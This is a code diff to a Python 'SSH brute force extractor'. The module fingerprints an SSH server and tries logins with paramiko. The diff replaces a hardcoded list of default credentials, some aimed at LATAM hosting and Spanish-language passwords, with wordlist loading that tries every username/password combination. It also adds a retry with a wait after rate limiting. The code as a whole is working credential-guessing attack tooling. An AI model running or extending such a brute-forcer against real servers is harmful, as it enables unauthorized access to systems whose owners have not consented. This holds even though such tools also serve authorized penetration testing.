@@ -1,61 +1,18 @@
-"""SSH brute force extractor — fingerprints SSH server and tests default credentials."""
+"""SSH brute force extractor — fingerprints SSH server and tests credentials from wordlists."""
 
-from datetime import time
+import itertools
+import os
 import socket
 
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Common default/weak SSH credentials
-DEFAULT_CREDENTIALS = [
-    ('root', ''),
-    ('root', 'root'),
-    ('root', 'password'),
-    ('root', 'admin'),
-    ('root', 'toor'),
-    ('root', '123456'),
-    ('admin', 'admin'),
-    ('admin', 'password'),
-    ('admin', ''),
-    ('ubuntu', 'ubuntu'),
-    ('ubuntu', ''),
-    ('debian', 'debian'),
-    ('user', 'user'),
-    ('user', 'password'),
-    ('test', 'test'),
-    ('guest', 'guest'),
-    ('pi', 'raspberry'),
-    ('oracle', 'oracle'),
-    ('postgres', 'postgres'),
-    ('mysql', 'mysql'),
-    # cPanel/WHM hosting defaults (common in Chilean shared hosting)
-    ('cpanel', 'cpanel'),
-    ('cpanel', ''),
-    ('whm', 'whm'),
-    ('webmaster', 'webmaster'),
-    ('webmaster', ''),
-    ('ftp', 'ftp'),
-    ('ftp', ''),
-    ('www', 'www'),
-    ('www', ''),
-    # Common Spanish-language weak passwords
-    ('root', 'clave'),
-    ('root', 'contrasena'),
-    ('root', 'servidor'),
-    ('admin', 'clave'),
-    ('admin', '1234'),
-    ('root', '1234'),
-    ('root', '12345678'),
-    ('usuario', 'usuario'),
-    ('usuario', '1234'),
-    # Common vendor defaults seen in LATAM deployments
-    ('support', 'support'),
-    ('support', ''),
-    ('deploy', 'deploy'),
-    ('ansible', 'ansible'),
-]
+# Fallback credentials if wordlists are not found
+FALLBACK_USERNAMES = ['root', 'admin', 'user', 'ubuntu', 'cpanel', 'webmaster']
+FALLBACK_PASSWORDS = ['', 'root', 'admin', 'password', '123456', 'toor']
 
 
 class SSHExtractor:
-    """Fingerprints SSH server version and attempts login with default credentials."""
+    """Fingerprints SSH server version and attempts login with credentials from wordlists."""
 
     def __init__(self, ip: str, port: int = 22):
         """Initialize with target IP and port.
@@ -68,7 +25,7 @@ class SSHExtractor:
         self.port = port
 
     def run(self):
-        """Connect to SSH, read banner, then test default credentials.
+        """Connect to SSH, read banner, then test credentials from wordlists.
 
         Returns:
             dict: SSH version, credential results, and any successful logins.
@@ -82,12 +39,13 @@ class SSHExtractor:
 
         if not self._has_paramiko():
             print(f"  [SSH] paramiko not installed — run: pip install paramiko")
-            print(f"  [SSH] Skipping credential tests")
             result['status'] = 'no_paramiko'
             return result
 
-        print(f"  [SSH] Testing {len(DEFAULT_CREDENTIALS)} default credentials...")
-        for username, password in DEFAULT_CREDENTIALS:
+        credentials = self._load_credentials()
+        print(f"  [SSH] Testing {len(credentials)} combinations...")
+
+        for username, password in credentials:
             status = self._test_credential(username, password)
             display = f"{username}:{password if password else '(empty)'}"
             if status == 'success':
@@ -99,6 +57,45 @@ class SSHExtractor:
                 print(f"  [SSH] Error testing {display}: {status}")
 
         return result
+
+    def _load_credentials(self) -> list:
+        """Load usernames and passwords from wordlist files and return all combinations.
+
+        Looks for any .txt file in the wordlists/ directory.
+        Expects at least one file with 'user' in the name and one with 'pass' in the name.
+        Falls back to built-in defaults if files are not found.
+
+        Returns:
+            list: List of (username, password) tuples.
+        """
+        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
+        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
+        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
+        return list(itertools.product(usernames, passwords))
+
+    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
+        """Find and load a wordlist file whose name contains the given keyword.
+
+        Args:
+            directory (str): Path to wordlists directory.
+            keyword (str): Keyword to match in filename (e.g. 'user', 'pass').
+            fallback (list): Default list to use if no matching file is found.
+
+        Returns:
+            list: Lines from the matched file, or fallback list.
+        """
+        try:
+            for filename in os.listdir(directory):
+                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
+                    filepath = os.path.join(directory, filename)
+                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                        lines = [line.strip() for line in f if line.strip()]
+                    print(f"  [SSH] Loaded {len(lines)} entries from {filename}")
+                    return lines
+        except FileNotFoundError:
+            pass
+        print(f"  [SSH] No wordlist found for '{keyword}' — using fallback ({len(fallback)} entries)")
+        return fallback
 
     def _get_banner(self) -> str:
         """Read the SSH version banner via raw TCP connection.
@@ -130,6 +127,7 @@ class SSHExtractor:
 
     def _test_credential(self, username: str, password: str) -> str:
         """Attempt SSH login with given credentials using paramiko.
+        Retries once after 10 seconds on connection failure.
 
         Args:
             username (str): SSH username to test.
@@ -140,24 +138,31 @@ class SSHExtractor:
         """
         import paramiko
         import time
-        time.sleep(0.5)
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            client.connect(
-                hostname=self.ip,
-                port=self.port,
-                username=username,
-                password=password,
-                timeout=5,
-                allow_agent=False,
-                look_for_keys=False,
-            )
-            client.close()
-            return 'success'
-        except paramiko.AuthenticationException:
-            return 'auth_failed'
-        except paramiko.ssh_exception.NoValidConnectionsError as e:
-            return f'no_connection: {e}'
-        except Exception as e:
-            return str(e)
+        time.sleep(1.5)
+
+        for attempt in range(2):
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                client.connect(
+                    hostname=self.ip,
+                    port=self.port,
+                    username=username,
+                    password=password,
+                    timeout=5,
+                    allow_agent=False,
+                    look_for_keys=False,
+                )
+                client.close()
+                return 'success'
+            except paramiko.AuthenticationException:
+                return 'auth_failed'
+            except paramiko.ssh_exception.NoValidConnectionsError:
+                if attempt == 0:
+                    print(f"  [SSH] Rate limited — waiting 10s before retry...")
+                    time.sleep(10)
+                else:
+                    return 'no_connection'
+            except Exception as e:
+                return str(e)
+        return 'no_connection'
